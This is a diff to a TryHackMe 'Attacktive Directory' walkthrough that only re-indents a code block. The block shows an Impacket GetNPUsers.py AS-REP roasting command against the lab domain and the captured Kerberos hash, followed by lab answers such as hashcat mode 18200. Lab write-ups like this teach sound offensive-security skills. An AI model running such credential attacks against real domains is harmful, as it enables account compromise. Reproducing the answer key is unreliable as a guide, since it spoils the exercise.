@@ -105,13 +105,14 @@ Room Link: [https://tryhackme.com/r/room/attacktivedirectory](https://tryhackme.
 1. Read this section, then proceed.
 2. We can use `GetNPUsers.py -dc-ip spookysec.local spookysec.local/svc-admin -no-pass` or `GetNPUsers.py -dc-ip spookysec.local spookysec.local/ -no-pass -usersfile user.txt` after saving all users to `user.txt` to capture `TGT Token` of `svc-admin` using ASREPRoasting method.
    
-   ```bash
-   GetNPUsers.py -dc-ip spookysec.local spookysec.local/svc-admin -no-pass
-   Impacket v0.12.0.dev1+20240807.21946.829239e - Copyright 2023 Fortra
-   
-   [*] Getting TGT for svc-admin
-   $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:92f01444cd97361751ec4fb5b5ea985a$04b60fa94a84739e7db13609241d16247154e8d1f952c26a0c5063e53d08c9a4365690982460f7872d8ade23113cd4df929c85d5404f4380fdcaa5af2ee22d7988d7ee428e535be1b2dcff88bf574d418ca88c3b435cea77b6ea322b510bcf59ac1fba479d54db52104c3bec497cf1b81ddcd384bbb5d115ba2c380f0520705c7b63c88f548f17a9c6c8c1b746175b896b29555a45002ad5195a90d42c45193e42915a1107ed46a6b79da94b835f5e7bd8858c0bb7f07fecab80f7097c769da284ea270697500ea73ea223d93684e8d087248610cf7809d076d5e97564e9729ec5aa04656eaec9f3f5a92ecfaa8524346e93
-   ```
+```bash
+GetNPUsers.py -dc-ip spookysec.local spookysec.local/svc-admin -no-pass
+Impacket v0.12.0.dev1+20240807.21946.829239e - Copyright 2023 Fortra
+
+[*] Getting TGT for svc-admin
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:92f01444cd97361751ec4fb5b5ea985a$04b60fa94a84739e7db13609241d16247154e8d1f952c26a0c5063e53d08c9a4365690982460f7872d8ade23113cd4df929c85d5404f4380fdcaa5af2ee22d7988d7ee428e535be1b2dcff88bf574d418ca88c3b435cea77b6ea322b510bcf59ac1fba479d54db52104c3bec497cf1b81ddcd384bbb5d115ba2c380f0520705c7b63c88f548f17a9c6c8c1b746175b896b29555a45002ad5195a90d42c45193e42915a1107ed46a6b79da94b835f5e7bd8858c0bb7f07fecab80f7097c769da284ea270697500ea73ea223d93684e8d087248610cf7809d076d5e97564e9729ec5aa04656eaec9f3f5a92ecfaa8524346e93
+```
+
 - Question `We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?` Answer `svc-admin`
 - Question `Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)` Answer `Kerberos 5 AS-REP etype 23`. Source: https://hashcat.net/wiki/doku.php?id=example_hashes
 - Question `What mode is the hash?` Answer `18200` Source: https://hashcat.net/wiki/doku.php?id=example_hashes
